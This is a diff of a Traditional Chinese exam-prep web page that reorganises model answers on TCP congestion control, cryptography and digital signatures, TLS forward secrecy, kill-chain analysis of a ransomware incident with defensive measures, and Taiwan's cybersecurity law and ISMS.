+          <tr><td>機制</td><td><strong>滑動視窗</strong>——接收端在 ACK 中回報 <strong>rwnd</strong>（接收視窗大小），傳送端據以限速</td><td>傳送端自行維護 <strong>cwnd</strong>（擁塞視窗），依據封包遺失與 RTT 動態調整</td></tr>
+          <tr><td>資訊來源</td><td><strong>接收端明確告知</strong></td><td><strong>由封包遺失等現象推測</strong>（網路不會主動通知）</td></tr>
+        </table></div>
+        <div class="frame">
+          <span class="t">📐 實際傳送量</span>
+          <strong>可傳送量 = min( rwnd , cwnd )</strong>　← 兩個限制取較嚴格者
+        </div>
+        <div class="table-wrap"><table>
+          <tr><th>擁塞控制的四個階段</th><th>作法</th></tr>
+          <tr><td><strong>① 慢啟動</strong>（Slow Start）</td><td>cwnd 由 1 開始，每收到 ACK 就<strong>倍增</strong>（指數成長），直到門檻值 ssthresh</td></tr>
+          <tr><td><strong>② 壅塞避免</strong></td><td>超過門檻後改為<strong>每個 RTT 加 1</strong>（線性成長），避免衝過頭</td></tr>
+          <tr><td><strong>③ 快速重送</strong></td><td>收到 <strong>3 個重複 ACK</strong> → 不等逾時，<strong>立即重送</strong>該封包</td></tr>
+          <tr><td><strong>④ 快速回復</strong></td><td>門檻減半、cwnd 減半後回到壅塞避免（<u>而非退回 1</u>）——TCP Reno 的改良</td></tr>
+        </table></div>
+        <p style="font-size:.88rem"><strong>一句話總結</strong>：流量控制是<strong>「接收端喊停」</strong>；擁塞控制是<strong>「傳送端自己看路況踩煞車」</strong>。</p>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 比較表至少七個欄位；<strong>UDP 支援群播</strong>是常漏的一項<br>
+        2. 應用<strong>必須說明理由</strong>，不能只列名稱；DNS 用 UDP 的理由要寫「交握成本高於重送成本」<br>
+        3. <strong>交握與斷線都要畫圖並標 seq/ack</strong><br>
+        4. <strong>「為何三次、為何四次」是本題核心</strong>——四次的關鍵是<strong>全雙工，對方可能還有資料要傳</strong><br>
+        5. 補充 <strong>TIME_WAIT 2MSL</strong> 與 <strong>SYN Flood／SYN Cookie</strong><br>
+        6. 第三小題<strong>務必寫出 min(rwnd, cwnd)</strong> 與擁塞控制四階段
+        </div>
       </div>
     </details>
   </div>
@@ -1051,47 +1150,89 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、對稱式與非對稱式之比較</strong><br>
-        　（一）表格（金鑰／速度／金鑰數量 n(n−1)/2 vs 2n／配送難度／可否簽章／代表演算法）<br>
-        　（二）<strong>非對稱式解決的核心問題：金鑰配送</strong><br>
-        　（三）非對稱式之代價：運算慢 100～1000 倍，故不適合大量資料<br>
-        　（四）常見演算法：AES（對稱）；RSA（因數分解）、ECC（橢圓曲線離散對數，金鑰更短）<br><br>
-        <strong>二、數位簽章</strong><br>
-        　（一）<strong>簽署流程</strong>：<br>
-        　　　① 對原文計算<strong>雜湊值</strong>（訊息摘要）<br>
-        　　　② 以<strong>簽署者私鑰</strong>加密雜湊值 → 數位簽章<br>
-        　　　③ 傳送「原文 ＋ 簽章」<br>
-        　（二）<strong>驗證流程</strong>：<br>
-        　　　④ 以<strong>簽署者公鑰</strong>解開簽章 → 雜湊值 A<br>
-        　　　⑤ 對收到的原文自行計算 → 雜湊值 B<br>
-        　　　⑥ 比對 A、B 是否相同<br>
-        　（三）<u>畫流程圖</u>（本題最重要的得分動作）<br>
-        　（四）達成之資安目標：<br>
-        　　　‧ <strong>完整性</strong>：內容遭改則雜湊值不符<br>
-        　　　‧ <strong>鑑別性</strong>：只有持有該私鑰者能產生此簽章<br>
-        　　　‧ <strong>不可否認性</strong>：私鑰僅簽署者持有，事後無法抵賴<br>
-        　　　‧ <strong>不提供機密性</strong>（原文為明文；如需保密須另行加密）<br>
-        　（五）與 HMAC 之比較：HMAC 使用<strong>共享</strong>金鑰，雙方皆可產生 → 可達完整性與來源鑑別，但<strong>無法達成不可否認性</strong><br>
-        　（六）<strong>為何先雜湊再簽</strong>：非對稱運算慢且原文可能很大，雜湊後為固定短長度，效率高<br>
-        　（七）公鑰真偽問題 → 引出 <strong>PKI 與數位憑證</strong>（由 CA 背書）<br><br>
-        <strong>三、HTTPS 與前向保密</strong><br>
-        　（一）TLS 交握流程：<br>
-        　　　① Client Hello（版本、加密套件、隨機數）<br>
-        　　　② Server Hello（選定套件、隨機數）<br>
-        　　　③ 伺服器送出<strong>數位憑證</strong><br>
-        　　　④ 用戶端<strong>驗證憑證</strong>（信任鏈、有效期、網域相符、是否撤銷）<br>
-        　　　⑤ 以 <strong>ECDHE</strong> 協商出<strong>對稱工作金鑰</strong><br>
-        　　　⑥ 後續資料以 <strong>AES-GCM</strong> 等對稱式加密傳輸<br>
-        　（二）<strong>混合加密之設計精神</strong>：以非對稱式解決「信任與金鑰交換」，以對稱式處理「大量資料」，兼顧安全與效能<br>
-        　（三）<strong>前向保密（PFS）</strong>：<br>
-        　　　‧ 定義：每次連線使用<strong>臨時金鑰</strong>協商工作金鑰，且該金鑰<u>無法</u>由伺服器長期私鑰推導<br>
-        　　　‧ 價值：即使日後伺服器私鑰外洩，<strong>過去錄存的通訊仍無法被解密</strong><br>
-        　　　‧ 實作：採 <strong>ECDHE／DHE</strong> 金鑰交換（非傳統 RSA 金鑰傳輸）<br>
-        　（四）機關網站建議：停用 SSL 3.0／TLS 1.0/1.1、啟用 TLS 1.2 以上、優先選用支援 PFS 之加密套件、設定 <strong>HSTS</strong>、定期檢視憑證有效期<br><br>
-        <strong>四、結論</strong>：密碼學工具須依<strong>資安目標</strong>選用——保密用加密、防竄改用雜湊、須歸責則用數位簽章；實務上並須注意演算法強度、作業模式與金鑰管理，三者缺一不可。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、兩種加密比較（表）→ 二、<u>數位簽章流程圖</u>＋資安目標（表）→ 三、HTTPS 混合加密流程＋前向保密
         </div>
-        <strong>💡 拿分關鍵</strong>：數位簽章流程<strong>一定要畫圖</strong>。「數位簽章不提供機密性」與「為何先雜湊再簽」是兩個高鑑別度的細節。前向保密能寫出來的考生不多，寫了就贏。
+
+        <strong>📊 一、對稱式 vs 非對稱式</strong>
+        <div class="table-wrap"><table>
+          <tr><th>比較點</th><th>對稱式加密</th><th>非對稱式加密</th></tr>
+          <tr><td>金鑰</td><td>加解密用<strong>同一把</strong></td><td><strong>公鑰／私鑰成對</strong>，一把加另一把解</td></tr>
+          <tr><td>速度</td><td><strong>快</strong>（適合大量資料）</td><td>慢 <strong>100～1000 倍</strong></td></tr>
+          <tr><td><strong>金鑰數量</strong>（n 人互通）</td><td><strong>n(n−1)/2</strong> 把（成長極快）</td><td><strong>2n</strong> 把（線性成長）</td></tr>
+          <tr><td><strong>金鑰配送</strong></td><td><strong>困難</strong>——須先有安全管道交換金鑰</td><td><strong>容易</strong>——公鑰可公開發布</td></tr>
+          <tr><td>可否數位簽章</td><td><strong>不可</strong>（雙方都有同一把鑰，無法歸責）</td><td><strong>可以</strong></td></tr>
+          <tr><td>常見演算法</td><td>AES、3DES、ChaCha20</td><td>RSA、ECC、DH／ECDH</td></tr>
+          <tr><td>主要用途</td><td><strong>大量資料加密</strong></td><td><strong>金鑰交換、數位簽章、身分驗證</strong></td></tr>
+        </table></div>
+        <p style="font-size:.88rem"><strong>金鑰數量對比實例</strong>：100 人互通 → 對稱式需 <strong>4,950 把</strong>；非對稱式僅需 <strong>200 把</strong>。這正是 PKI 存在的理由。</p>
+
+        <strong>📊 二、數位簽章</strong>
+        <pre>【簽署端 A】
+   原文 ──①雜湊(SHA-256)──► 訊息摘要
+                              │
+                              ②以【A 的私鑰】加密
+                              ▼
+                          數位簽章
+   ③傳送：原文（明文）＋ 數位簽章 ＋ A 的憑證
+
+【驗證端 B】
+   收到的簽章 ──④以【A 的公鑰】解密──► 摘要 A
+   收到的原文 ──⑤重新雜湊─────────► 摘要 B
+
+   ⑥比對：摘要 A == 摘要 B ?
+          相同 → 原文未遭竄改，且確為 A 所簽 ✔
+          不同 → 原文被改，或簽章者非 A ✘</pre>
+        <div class="table-wrap"><table>
+          <tr><th>資安目標</th><th>如何達成</th></tr>
+          <tr><td><strong>完整性</strong>（Integrity）</td><td>原文只要改動一個位元，雜湊值即完全不同 → 比對失敗</td></tr>
+          <tr><td><strong>鑑別性</strong>（Authentication）</td><td>只有持有該私鑰者才能產生可用其公鑰解開的簽章</td></tr>
+          <tr><td><strong>不可否認性</strong>（Non-repudiation）</td><td><strong>私鑰僅簽署者持有</strong>，事後無法抵賴——<u><strong>HMAC 做不到這一點</strong></u>（雙方共享金鑰，可互相推託）</td></tr>
+          <tr><td><u>不提供機密性</u></td><td><strong>原文是明文傳送</strong>；如需保密須<u>另以對方公鑰或對稱金鑰加密</u></td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>常見追問</th><th>答案</th></tr>
+          <tr><td>為何<strong>先雜湊再簽</strong>？</td><td>非對稱運算慢且原文可能很大；雜湊為<strong>固定短長度</strong>，簽章效率高得多</td></tr>
+          <tr><td>為何需要<strong>憑證（CA）</strong>？</td><td>驗證端必須確認「這把公鑰真的屬於 A」→ 由<strong>憑證機構</strong>簽發憑證作為信任基礎，否則會遭<strong>中間人攻擊</strong></td></tr>
+          <tr><td>加密與簽章的口訣</td><td><strong>要保密 → 用「對方的公鑰」加密</strong>；<strong>要簽名 → 用「自己的私鑰」簽章</strong></td></tr>
+        </table></div>
+
+        <strong>📊 三、HTTPS 混合加密與前向保密</strong>
+        <div class="table-wrap"><table>
+          <tr><th>階段</th><th>使用的加密</th><th>作用</th></tr>
+          <tr><td><strong>① 交握階段</strong></td><td><strong>非對稱式</strong></td><td>驗證伺服器<strong>憑證</strong>（身分）＋ <strong>協商出對稱式的工作階段金鑰</strong></td></tr>
+          <tr><td><strong>② 資料傳輸</strong></td><td><strong>對稱式</strong>（AES-GCM）</td><td>以工作階段金鑰加密所有實際資料</td></tr>
+          <tr><td>③ 完整性</td><td>雜湊／AEAD</td><td>確保資料未遭竄改</td></tr>
+        </table></div>
+        <div class="frame">
+          <span class="t">📐 為何要混合？</span>
+          <strong>非對稱式解決「金鑰配送與信任」但太慢；對稱式夠快但無法安全交換金鑰。</strong><br>
+          → 用非對稱式<strong>安全地交換一把對稱金鑰</strong>，之後全部改用對稱式。<br>
+          這是「<strong>用慢的解決信任問題，用快的解決效能問題</strong>」的經典設計。
+        </div>
+        <div class="table-wrap"><table>
+          <tr><th>前向保密（Forward Secrecy）</th><th>說明</th></tr>
+          <tr><td>定義</td><td><strong>即使伺服器的長期私鑰日後外洩，過去已錄下的加密通訊仍無法被解密</strong></td></tr>
+          <tr><td>沒有 FS 的風險</td><td>傳統 RSA 金鑰交換中，工作階段金鑰是<u>以伺服器公鑰加密後傳送</u>的。攻擊者若長期側錄流量，一旦取得私鑰，即可<strong>回頭解開所有歷史通訊</strong></td></tr>
+          <tr><td><strong>實作方式</strong></td><td>採 <strong>DHE／ECDHE</strong>（臨時 Diffie-Hellman）金鑰交換：<br>‧ 每次連線<strong>各自產生臨時金鑰對</strong>，協商出工作階段金鑰<br>‧ <strong>臨時私鑰用完即丟，從不儲存也從不傳送</strong><br>‧ 伺服器的長期私鑰<strong>只用來「簽章」證明身分，不用來加密金鑰</strong></td></tr>
+          <tr><td>現況</td><td><strong>TLS 1.3 已移除不具前向保密的金鑰交換方式</strong>，強制使用 (EC)DHE</td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>機關實務建議</th><th>說明</th></tr>
+          <tr><td>版本</td><td>應停用 SSL 全系列與 <strong>TLS 1.0／1.1</strong>，採 <strong>TLS 1.2 以上（建議 1.3）</strong></td></tr>
+          <tr><td>加密套件</td><td>優先選用支援 <strong>ECDHE</strong> 與 <strong>AEAD（AES-GCM）</strong> 者</td></tr>
+          <tr><td>憑證管理</td><td>建立<strong>到期監控</strong>機制（憑證過期是最常見的服務中斷原因）；私鑰妥善保管</td></tr>
+          <tr><td>強制加密</td><td>全站 HTTPS、啟用 <strong>HSTS</strong>，HTTP 自動轉址</td></tr>
+        </table></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 比較表<strong>務必寫出金鑰數量公式</strong> n(n−1)/2 vs 2n，並<strong>代數字舉例</strong><br>
+        2. <strong>數位簽章流程必須畫圖</strong>，六個步驟都要標出用了哪把鑰<br>
+        3. 明確指出<strong>「數位簽章不提供機密性」</strong>與<strong>「HMAC 無不可否認性」</strong>——兩大鑑別點<br>
+        4. 說明<strong>為何先雜湊再簽</strong>、<strong>為何需要憑證</strong><br>
+        5. HTTPS 要說明<strong>混合加密的設計理由</strong>（慢的解決信任、快的解決效能）<br>
+        6. 前向保密的核心是<strong>「臨時金鑰用完即丟，長期私鑰只用於簽章」</strong>；補上 <strong>TLS 1.3 強制 (EC)DHE</strong> 更完整
+        </div>
       </div>
     </details>
   </div>
@@ -1106,50 +1247,70 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、以網路殺鏈分析本案</strong><br>
-        <div class="table-wrap"><table>
-          <tr><th>階段</th><th>本案對應情形</th></tr>
-          <tr><td>① 偵查 Reconnaissance</td><td>蒐集機關人員名單、職稱、電子郵件（多來自機關網站、公開通訊錄、社群媒體）</td></tr>
-          <tr><td>② 武器化 Weaponization</td><td>製作含惡意巨集或漏洞利用之附件檔案</td></tr>
-          <tr><td>③ 投遞 Delivery</td><td>以<strong>魚叉式釣魚郵件</strong>寄送予特定員工</td></tr>
-          <tr><td>④ 入侵利用 Exploitation</td><td>員工開啟附件，觸發巨集或未修補之漏洞</td></tr>
-          <tr><td>⑤ 安裝 Installation</td><td>植入後門程式，建立持續存取管道</td></tr>
-          <tr><td>⑥ C2 命令控制</td><td>與外部中繼站建立連線，接受指令</td></tr>
-          <tr><td>⑦ 行動達成目標</td><td><strong>橫向移動</strong>、竊取憑證、<strong>提權至網域管理員</strong>、部署勒索軟體加密伺服器</td></tr>
-        </table></div>
-        　補充：本案顯示<strong>單一端點失陷即演變為全機關事件</strong>，關鍵失效點在於「未能阻止橫向移動與提權」。<br><br>
-        <strong>二、各階段防護措施</strong>（逐階段對應，結構清楚才拿得到分）<br>
-        　（一）偵查：減少公開資訊揭露、通訊錄不公開至個人層級、教育人員注意社群媒體洩漏職務資訊<br>
-        　（二）投遞：<strong>郵件安全閘道</strong>（附件沙箱、URL 檢測）、封鎖高風險副檔名、外部郵件加註警示標示、<strong>SPF／DKIM／DMARC</strong> 防冒名<br>
-        　（三）入侵利用：<strong>修補管理</strong>（作業系統與 Office 定期更新）、<strong>停用巨集</strong>或僅允許簽章巨集、應用程式白名單、瀏覽器與文件軟體沙箱<br>
-        　（四）安裝：<strong>EDR</strong> 行為式偵測（非僅特徵碼）、限制使用者為<strong>非系統管理員權限</strong>、防止未授權程式駐留<br>
-        　（五）C2：<strong>出向流量管控</strong>（防火牆雙向規則）、DNS 查詢監控、封鎖已知惡意網域（威脅情資）、代理伺服器記錄<br>
-        　（六）行動達成：<br>
-        　　　‧ <strong>網段隔離／微分段</strong>，限制橫向移動<br>
-        　　　‧ <strong>特權帳號管理（PAM）</strong>、管理者帳號與一般帳號分離、<strong>禁止以網域管理員登入一般端點</strong><br>
-        　　　‧ 全面 <strong>MFA</strong><br>
-        　　　‧ <strong>離線／不可變備份</strong>（3-2-1 原則）<br>
-        　（七）貫穿各階段：<strong>教育訓練與社交工程演練</strong>、<strong>SIEM 集中監控與關聯分析</strong>、定期弱點掃描與滲透測試<br>
-        　（八）強調<strong>縱深防禦</strong>：越早階段阻斷，成本越低、損害越小<br><br>
-        <strong>三、應變流程與通報義務</strong><br>
-        　（一）應變六階段（NIST）：<br>
-        　　　① <strong>準備</strong>：應變計畫、CSIRT 團隊、聯絡清單、演練<br>
-        　　　② <strong>偵測與分析</strong>：確認事件真偽、判定影響範圍與<strong>事件等級</strong><br>
-        　　　③ <strong>圍堵</strong>：隔離受害主機（<u>拔網路線而非直接關機</u>）、阻斷 C2、暫停受影響服務<br>
-        　　　④ <strong>根除</strong>：清除惡意程式、修補入侵管道、<strong>重設所有可能外洩之憑證</strong>（尤其網域管理員）<br>
-        　　　⑤ <strong>復原</strong>：由<u>經確認乾淨</u>之備份還原、加強監控後分階段恢復服務<br>
-        　　　⑥ <strong>事後檢討</strong>：根因分析、改善措施並追蹤列管<br>
-        　（二）<strong>證據保全</strong>：先取得記憶體映像與磁碟映像、保存日誌，維持<strong>證據監管鏈（Chain of Custody）</strong>；<u>切勿急於重灌</u><br>
-        　（三）<strong>法定通報義務</strong>：<br>
-        　　　1. 依《<strong>資通安全管理法</strong>》及《資通安全事件通報及應變辦法》，於知悉後<strong>規定時限內</strong>向上級或主管機關通報；本案屬影響重大者，須於更短時限通報並提出<strong>調查、處理及改善報告</strong><br>
-        　　　2. 若涉及個人資料外洩，依《<strong>個人資料保護法</strong>》應查明後<strong>通知當事人</strong><br>
-        　　　3. 涉及犯罪者得依《刑法》妨害電腦使用罪章報請司法機關偵辦<br>
-        　（四）<strong>贖金立場</strong>：原則上<strong>不支付</strong>——無法保證解密、助長犯罪，且公務機關支付涉及預算與法律爭議<br>
-        　（五）對外溝通：統一發言窗口，避免資訊混亂造成二次傷害<br><br>
-        <strong>四、結論</strong>：本案顯示技術防護與人員意識缺一不可；機關應以<strong>縱深防禦</strong>降低單點失效之衝擊，並以<strong>離線備份</strong>確保最壞情況下的復原能力，同時落實法定通報義務。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、殺鏈七階段對應本案（<u>主表</u>）→ 二、各階段防護措施（<u>主表</u>）→ 三、應變七步驟＋法定通報 → 四、事後改善
         </div>
-        <strong>💡 拿分關鍵</strong>：三個小題都要完整回答。第二小題<strong>逐階段對應防護措施</strong>是本題骨架，不能只列一堆措施而不對應階段。「拔網路線而非關機」「不要急著重灌」「重設所有憑證」「離線備份」這四個實務細節是高分關鍵。
+
+        <strong>📊 一、網路殺鏈七階段對應本案</strong>
+        <div class="table-wrap"><table>
+          <tr><th>階段</th><th>攻擊者行為</th><th>本案對應</th></tr>
+          <tr><td><strong>① 偵察</strong>（Reconnaissance）</td><td>蒐集目標資訊</td><td>由機關網站、公開名冊蒐集<strong>員工姓名、職稱、電子郵件</strong>與組織架構</td></tr>
+          <tr><td><strong>② 武器化</strong>（Weaponization）</td><td>製作攻擊工具</td><td>製作<strong>含惡意巨集的文件</strong>或惡意連結，包裝成公文或研習通知</td></tr>
+          <tr><td><strong>③ 遞送</strong>（Delivery）</td><td>將工具送達目標</td><td><strong>寄送釣魚郵件</strong>（冒充上級機關或同仁）</td></tr>
+          <tr><td><strong>④ 利用</strong>（Exploitation）</td><td>觸發漏洞或誘使執行</td><td>員工<strong>開啟附件並啟用巨集</strong>，或利用未修補之軟體漏洞</td></tr>
+          <tr><td><strong>⑤ 安裝</strong>（Installation）</td><td>植入後門並取得持久化</td><td>植入<strong>惡意程式與後門</strong>，設定開機自動執行</td></tr>
+          <tr><td><strong>⑥ 命令與控制</strong>（C2）</td><td>建立回連通道</td><td>受害主機<strong>對外連回 C2 伺服器</strong>，攻擊者遠端操控</td></tr>
+          <tr><td><strong>⑦ 行動</strong>（Actions on Objectives）</td><td>達成目的</td><td><strong>橫向移動</strong>→ 竊取憑證 → <strong>提權至網域管理員</strong> → 竊取資料 → <strong>部署勒索軟體加密伺服器</strong></td></tr>
+        </table></div>
+        <div class="hl"><strong>殺鏈的核心價值：攻擊必須「每一階段都成功」，防守方只要「打斷任何一環」即可阻止攻擊。</strong>——這句一定要寫。</div>
+
+        <strong>📊 二、各階段防護措施</strong>
+        <div class="table-wrap"><table>
+          <tr><th>階段</th><th>防護措施</th></tr>
+          <tr><td>① 偵察</td><td>減少<strong>公開資訊揭露</strong>（避免公布完整通訊錄）；監控機關名稱之<strong>相似網域註冊</strong></td></tr>
+          <tr><td>③ 遞送</td><td><strong>郵件安全閘道</strong>（附件沙箱、URL 檢測）；封鎖高風險副檔名；<strong>外部郵件加註警示</strong>；SPF／DKIM／DMARC 防偽冒</td></tr>
+          <tr><td>④ 利用<br>（<strong>本案關鍵失效點</strong>）</td><td><strong>修補管理</strong>（作業系統與應用軟體定期更新）；<strong>停用 Office 巨集</strong>；使用者<strong>非管理員權限</strong>；<strong>社交工程演練</strong>與教育訓練</td></tr>
+          <tr><td>⑤ 安裝</td><td><strong>EDR</strong>（行為式偵測，補足特徵碼防毒之不足）；應用程式<strong>白名單</strong>；監控自動執行項目</td></tr>
+          <tr><td>⑥ C2</td><td><strong>出向流量管控</strong>（<u>最常被忽略</u>）；DNS 過濾與惡意網域封鎖；異常連線告警</td></tr>
+          <tr><td>⑦ 行動<br>（<strong>本案損害擴大主因</strong>）</td><td><strong>網段隔離</strong>限制橫向移動；<strong>全面 MFA</strong>；<strong>特權帳號管理</strong>（禁止以網域管理員登入一般端點）；<strong>離線／不可變備份</strong>；資料外洩防護（DLP）</td></tr>
+          <tr><td>全程</td><td><strong>日誌集中與監控（SIEM）</strong>；定期弱點掃描與滲透測試；依《資通安全管理法》訂定資通安全維護計畫</td></tr>
+        </table></div>
+        <div class="warn"><span class="t">⚠️ 本案的兩個根本問題</span>
+        <strong>① 一個員工的帳號被入侵，竟能一路提權到網域管理員</strong> → 表示<u>權限管理與網段隔離失效</u>。<br>
+        <strong>② 多台伺服器一起被加密</strong> → 表示<u>沒有有效的隔離，且備份很可能也在線上</u>。<br><br>
+        <strong>核心觀念：不能只想著「擋住入侵」（一定會有人點開釣魚信），而要假設「已被入侵」，設法把損害控制在最小範圍。</strong>
+        </div>
+
+        <strong>📊 三、應變處理流程與法定通報</strong>
+        <div class="table-wrap"><table>
+          <tr><th>階段</th><th>作為</th><th>注意</th></tr>
+          <tr><td><strong>① 準備</strong></td><td>平時即應訂有應變計畫、聯絡窗口與演練</td><td>事發時才找程序已經太遲</td></tr>
+          <tr><td><strong>② 偵測與分析</strong></td><td>確認受影響範圍、判定<strong>事件等級</strong></td><td>依影響程度分 <strong>1～4 級</strong></td></tr>
+          <tr><td><strong>③ 圍堵</strong></td><td>隔離受害主機、阻斷惡意連線、暫停檔案共享、必要時停止部分服務</td><td><strong>拔網路線而非直接關機</strong>（保留記憶體證據）</td></tr>
+          <tr><td><strong>④ 保存證據</strong></td><td>製作記憶體與磁碟映像、保全日誌</td><td><strong>切勿急於重灌</strong>——重灌即失去追查根因的機會</td></tr>
+          <tr><td><strong>⑤ 通報</strong></td><td>依《<strong>資通安全管理法</strong>》於<strong>規定時限內</strong>通報上級機關與主管機關</td><td><u>不得先處理完再通報</u>；<strong>3、4 級為重大事件</strong>，須另提<strong>調查、處理及改善報告</strong></td></tr>
+          <tr><td><strong>⑥ 根除</strong></td><td>清除惡意程式、修補入侵管道、<strong>重設所有可能外洩之憑證</strong></td><td>網域管理員已外洩 → <strong>全機關密碼須重設</strong></td></tr>
+          <tr><td><strong>⑦ 復原</strong></td><td>由<u>確認乾淨</u>的備份還原，逐步恢復服務並持續監控</td><td><strong>還原前先掃描</strong>；惡意程式可能潛伏數週，須確認備份時點乾淨</td></tr>
+          <tr><td><strong>⑧ 檢討改善</strong></td><td>根因分析、提出改善措施並追蹤落實</td><td>納入下年度資安維護計畫</td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>其他法定義務與原則</th><th>說明</th></tr>
+          <tr><td><strong>個資外洩通知</strong></td><td>若涉及民眾個人資料外洩，依《<strong>個人資料保護法</strong>》查明後應以適當方式<strong>通知當事人</strong></td></tr>
+          <tr><td>刑事責任</td><td>涉犯《刑法》妨害電腦使用罪章者，得<strong>報請司法機關偵辦</strong></td></tr>
+          <tr><td><strong>原則不支付贖金</strong></td><td>付款<strong>不保證能解密</strong>，且助長犯罪、可能觸法；應以還原備份為優先</td></tr>
+          <tr><td><strong>對外溝通</strong></td><td>服務中斷應<strong>對外公告替代作業方式</strong>，避免影響民眾權益；統一發言窗口，避免資訊混亂</td></tr>
+          <tr><td>外部支援</td><td>可請求<strong>技服中心</strong>或上級機關協助鑑識與處理</td></tr>
+        </table></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 殺鏈<strong>七階段名稱要正確</strong>，且<strong>每一階段都要對應本案情節</strong>——不能只背理論<br>
+        2. 寫出<strong>「攻擊須每階段成功，防守只要打斷一環」</strong><br>
+        3. 防護要<strong>逐階段對應</strong>；<strong>出向流量管控</strong>與<strong>特權帳號管理</strong>是高分項<br>
+        4. 點出本案兩個根本問題：<strong>權限提升失控</strong>與<strong>備份在線上</strong><br>
+        5. 應變流程<strong>「拔網路線而非關機」「先保存證據不可急於重灌」「重設所有憑證」</strong>三句必寫<br>
+        6. 通報要寫<strong>「知悉後即應於規定時限內通報，不得先處理完再通報」</strong>＋<strong>個資法通知當事人</strong><br>
+        7. 加分：<strong>原則不支付贖金</strong>、<strong>對外公告替代作業方式</strong>
+        </div>
       </div>
     </details>
   </div>
@@ -1163,41 +1324,85 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、《資通安全管理法》之主要要求</strong><br>
-        　（一）<strong>適用對象</strong>：公務機關、特定非公務機關（關鍵基礎設施提供者、公營事業、政府捐助之財團法人）<br>
-        　（二）<strong>資安責任等級</strong>：依業務重要性與資料敏感度分為 <strong>A～E 五級</strong>，等級越高應辦事項越多（專責人力、防護措施、演練與稽核頻率）<br>
-        　（三）<strong>訂定資通安全維護計畫</strong>並落實執行，定期提出實施情形<br>
-        　（四）<strong>資安事件通報與應變</strong>：知悉後於規定時限內通報；事件依影響程度分為 <strong>1～4 級</strong>，3、4 級為重大事件，須提出調查、處理及改善報告<br>
-        　（五）<strong>稽核</strong>：主管機關得辦理稽核；機關並應辦理內部稽核與改善追蹤<br>
-        　（六）<strong>人力配置</strong>：依責任等級配置資安專責人員，並符合訓練與證照要求<br>
-        　（七）<strong>委外管理</strong>：委外辦理資通系統時，應要求受託者符合資安相關規定，並納入契約管理與監督<br>
-        　（八）罰則：未依規定辦理者，主管機關得令限期改正並得處罰<br>
-        　※ 提醒：<strong>不必背條號與精確時限</strong>，寫「規定時限內」即可；硬背錯誤反而失分<br><br>
-        <strong>二、ISMS 與 PDCA</strong><br>
-        　（一）<strong>ISMS 定義</strong>：以系統化方法建立、實施、維持並持續改善資訊安全之管理制度，國際標準為 <strong>ISO/IEC 27001</strong><br>
-        　（二）核心精神：資安是<strong>管理問題</strong>而非單純技術問題，須以制度確保持續有效<br>
-        　（三）<strong>PDCA 循環</strong>：<br>
-        　　　‧ <strong>Plan</strong>：界定範圍與界限、訂定資安政策、<strong>資產盤點</strong>、<strong>風險評鑑</strong>（風險 = 威脅 × 弱點 × 衝擊）、選定控制措施、製作<strong>適用性聲明（SoA）</strong><br>
-        　　　‧ <strong>Do</strong>：實施風險處理計畫與控制措施、辦理教育訓練、建立作業程序<br>
-        　　　‧ <strong>Check</strong>：監控與量測、<strong>內部稽核</strong>、<strong>管理審查</strong>、演練檢討<br>
-        　　　‧ <strong>Act</strong>：矯正與預防措施、持續改善並進入下一循環<br>
-        　（四）風險處理四選項：<strong>降低、轉移、避免、接受</strong>（殘餘風險須經權責主管簽核接受）<br>
-        　（五）其他可參考框架：<strong>NIST CSF</strong>（識別、保護、偵測、應變、復原）、CIS Controls、COBIT<br><br>
-        <strong>三、資通安全維護計畫應包含之重點</strong><br>
-        　（一）<strong>組織與權責</strong>：資安推動組織、權責分工、資安長與專責人員<br>
-        　（二）<strong>資產與風險</strong>：資通系統<strong>資產盤點與分級</strong>、定期風險評鑑<br>
-        　（三）<strong>存取控制</strong>：帳號管理、<strong>最小權限</strong>、特權帳號管理、<strong>定期權限盤點</strong><br>
-        　（四）<strong>技術防護</strong>：網段隔離、防火牆、端點防護（EDR）、修補管理、加密機制、日誌保存與集中監控<br>
-        　（五）<strong>系統開發與委外</strong>：安全需求納入 SDLC、上線前<strong>源碼檢測與滲透測試</strong>、委外廠商資安要求與契約條款<br>
-        　（六）<strong>營運持續</strong>：備份策略（<strong>3-2-1、離線備份</strong>）、訂定 <strong>RTO／RPO</strong>、<strong>定期演練還原</strong><br>
-        　（七）<strong>事件通報應變</strong>：通報流程、應變小組、聯絡清單、演練<br>
-        　（八）<strong>教育訓練與認知</strong>：一般人員、資訊人員、主管分層辦理；<strong>社交工程演練</strong><br>
-        　（九）<strong>稽核與改善</strong>：內部稽核計畫、缺失追蹤列管<br>
-        　（十）<strong>資源投入</strong>：預算編列與人力配置<br><br>
-        <strong>四、結論</strong>：資安治理之成敗關鍵在於<strong>高階主管支持</strong>與<strong>制度落實</strong>；僅採購設備而無管理制度、教育訓練與持續稽核配合，難以發揮實效。應以 PDCA 循環持續改善，並將法規遵循要求融入日常作業流程。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、資安法主要要求（表，分「分級／計畫／通報／人力／稽核」）→ 二、ISMS 與 PDCA（表＋圖）→ 三、維護計畫重點（表）
         </div>
-        <strong>💡 拿分關鍵</strong>：這是「背得起來就有分」的題型，但要<strong>分點清楚</strong>。第三小題的十個面向能寫出七、八個就是高分。結論那句「只買設備不做管理沒有用」幾乎是必寫。
+
+        <strong>📊 一、《資通安全管理法》對公務機關之主要要求</strong>
+        <div class="table-wrap"><table>
+          <tr><th>面向</th><th>要求</th></tr>
+          <tr><td><strong>① 責任等級分級</strong></td><td>依機關<strong>業務重要性與資通系統之影響程度</strong>核定資通安全責任等級 <strong>A～E 五級</strong>；等級越高，應辦事項越多</td></tr>
+          <tr><td><strong>② 訂定並實施維護計畫</strong></td><td>應訂定<strong>資通安全維護計畫</strong>，並<strong>定期提出實施情形</strong>報主管機關</td></tr>
